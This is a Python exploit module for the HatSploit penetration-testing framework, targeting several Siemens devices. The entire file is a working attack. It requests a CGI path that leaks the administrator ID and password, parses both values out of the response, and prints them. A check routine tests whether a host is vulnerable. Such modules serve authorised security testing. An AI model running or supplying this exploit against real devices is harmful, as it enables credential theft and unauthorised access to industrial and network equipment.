"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.module import Module
from pex.proto.http import HTTPClient


class HatSploitModule(Module, HTTPClient):
    details = {
        "Category": "exploit",
        "Name": "Siemens Multi Credentials Disclosure",
        "Module": "exploit/linux/siemens/multi_credentials_disclosure",
        "Authors": ["Ivan Nikolsky (enty8080) - module developer"],
        "Description": "Siemens multiple devices credentials disclosure.",
        "Platform": "linux",
        "Rank": "high",
    }

    options = {
        "HOST": {
            "Description": "Remote host.",
            "Value": None,
            "Type": "ip",
            "Required": True,
        },
        "PORT": {
            "Description": "Remote port.",
            "Value": 80,
            "Type": "port",
            "Required": True,
        },
    }

    def exploit(self, remote_host, remote_port):
        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/cgi-bin/readfile.cgi?query=ADMINID",
        )

        try:
            username = (
                response.text.split(";")[0].replace('var Adm_ID="', "", 1)[0:-1].strip()
            )
            password = (
                response.text.split(";")[1]
                .replace('var Adm_Pass1="', "", 1)[0:-1]
                .strip()
            )

            self.print_table(
                "Credentials", ("Username", "Password"), (username, password)
            )
        except Exception:
            self.print_warning("Target vulnerable, but no credentials found.")

    def check(self):
        remote_host, remote_port = self.parse_options(self.options)

        response = self.http_request(
            method="GET",
            host=remote_host,
            port=remote_port,
            path="/cgi-bin/readfile.cgi?query=ADMINID",
        )

        if not response or response.status_code != 200:
            return False

        return True

    def run(self):
        remote_host, remote_port = self.parse_options(self.options)

        self.exploit(remote_host, remote_port)
